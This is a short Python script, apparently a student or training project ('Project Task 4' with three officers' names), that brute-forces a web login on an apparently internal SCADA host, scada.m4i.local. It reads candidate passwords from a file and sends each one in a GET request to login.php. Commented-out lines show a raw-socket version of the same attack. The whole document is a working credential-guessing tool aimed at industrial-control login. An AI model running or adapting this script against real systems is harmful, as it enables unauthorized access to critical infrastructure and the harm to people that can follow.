# Project  Task 4
# Capt Arif Alamri 
# Lt Micah Hayden
# Lt Lucas Mireles

from socket	import * 
import sys
import requests
import time
import random



#dest_ip = "10.12.1.244"	# scada.m4i.local 
#dest_port = 80	# web based
#source_ip = "10.204.0.13"
#clientSocket = socket(AF_INET, SOCK_STREAM)
#clientSocket.connect((dest_ip, dest_port))
#
passwords = open("passwords.txt", "r")
#
for password in passwords:
	ihatemylife = requests.get("http://scada.m4i.local//login.php?command={}".format(password))
	#message = "GET /login.php?command={} HTTP/1.1\r\n".format(password)
	#clientSocket.send(message.encode())
	#time.sleep(0.1) #dont overload buffer
#message = "GET /login.php?command={} HTTP/1.1\r\n\r\n".format("password")
#clientSocket.send(message.encode())
#sentence = input("press enter to close socket")
#clientSocket.close()